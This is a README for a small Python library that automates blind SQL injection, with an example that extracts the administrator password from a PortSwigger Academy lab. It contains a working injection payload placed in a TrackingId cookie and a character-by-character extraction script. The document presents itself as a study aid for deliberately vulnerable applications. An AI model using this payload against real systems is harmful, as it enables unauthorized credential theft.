# BSQL

Blind SQL injection library

This is a simple python package born out of AppSec research into SQL injection vulnerabilities. After learning how to extract data from applications using blind SQL vulnerabilites and performing a lot of repetetive actions, I decided to create this helper library to support and speed up my learning oportunites.

> this library is not intended to be used as anything other than a study aid - it is not designed to be used for nefarious purposes and there are many tools which brute force blind SQL exploits much more effectively than this library.

## API

## Usage

### PreReq

To use bsqli library you need identify the following data:

|Data|Description|
|:---|:----------|
|Target URL|Web URL containing the blind SQLi vulnerability|
|Headers|HTTP Request headers|
|Cookies|HTTP Regest cookies|
|Vulnerable Param|Identify the HTTP param with blind SQLi vulnerability - in this example it is "`TrackerId`" cookie|
|SQLi statement|SQL injection statement(s)|
|Truthy state|Identify the state change that a `True` SQLi condition causes - in this example the HTTP server returns HTTP content with the message "`Welcome back!`"| 

### Example

BSQLI makes blind SQLi data identification easier, however you first need to understand what blind SQL injection is and how to exploit the vulnerable web page.

>It is illegal to Hack web services without obtaining permission from the authorized owner! Only use this library as part of your study against delberately vulnerable web applications such as WebGoat, Juiceshop, DVWA, PortSwigger Academy tutorials, ...

In this example I will use the PortSwigger Academy SQL injection (blind) tutorials as a basis.

This library allosupports retrieval of data by systematically testing one character at a time.

1. As part of your recon activities, collate the data specified in the **PreReq** section. Commonly you'd use a proxy such as OWASP Zap or PortSwigger Burp suite to aid data gathering.

2. Create a python script and import `bsqli` library. Add the headers and cookies from step one in JSON format strings.

```python
import bsqli

target_url = "https://example-url.net/"
headers = "{ \
  'Host': '', \
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0', \
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', \
  'Accept-Language': 'en-GB,en;q=0.5', \
  'Accept-Encoding': 'gzip, deflate', \
  'Referer': '', \
  'Upgrade-Insecure-Requests': '1', \
  'Sec-Fetch-Dest': 'document', \
  'Sec-Fetch-Mode': 'navigate', \
  'Sec-Fetch-Site': 'same-origin', \
  'Sec-Fetch-User': '?1', \
  'Te': 'trailers' \
}"
cookies = "{'TrackingId': 'sometracking', 'session': 'somesession3XB7Q9TzmBiHPKxPdAjbl'}"

```

3. Create a callback handler (see API section). The hander manages the HTTP req setup (including SQL injection), call and response handling (SQLi Truthy condition)

```python
# SQLi Truthy condition
def true_response(resp_data, value):
  return resp_data.find(bytes(value, 'utf-8')) != -1

# Handler method [[str, str, int] bool]
# val: search value char
# op: conditional operator
# pos: (optional) character to identify (injected SQL specific)
def password_extraction_handler(val, op, pos):
  sql_passwd_inj = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {}, 1) {} '{}".format(pos, op, val)
  req.inject('cookie', 'TrackingId', sql_passwd_inj)

  return true_response(req.get().content, 'Welcome')
```

4. Instantiate `bsqli.SqlIRequest` object and setup input data (in this exampe it's lowercase alphanumeric values)

```python
# lowercase alphanumberic values as per PortSwigger Academy blind SQLi tutorials
data = list(map(str, range(0,10))) + list(string.ascii_lowercase)
req = InjectableHTTPRequest(target_url, headers, cookies)
```

5. Loop through each character in the password to extract the password

```python
password_len = 20 # this value can also be extract using `bsqli`
password = []
for pos in range(1,int(password_len)+1):
  password.append(binary_search(data, password_extraction_handler, pos))
  print('extracting password [%d%%]\r'%(int(pos / password_len * 100)), end="")

print("\nPassword: {}".format("".join(password)), flush=True)
```

## Installation

Fetching / Installing BSQLI is simple. This package is not yet pushed to PyPi so the best way to install it is to `cd` into the repo clone directory and run the following command.

```
pip install .
```

## Repository

https://github.com/mdtetlow/sqli-python

## Requirements

Python 3.6
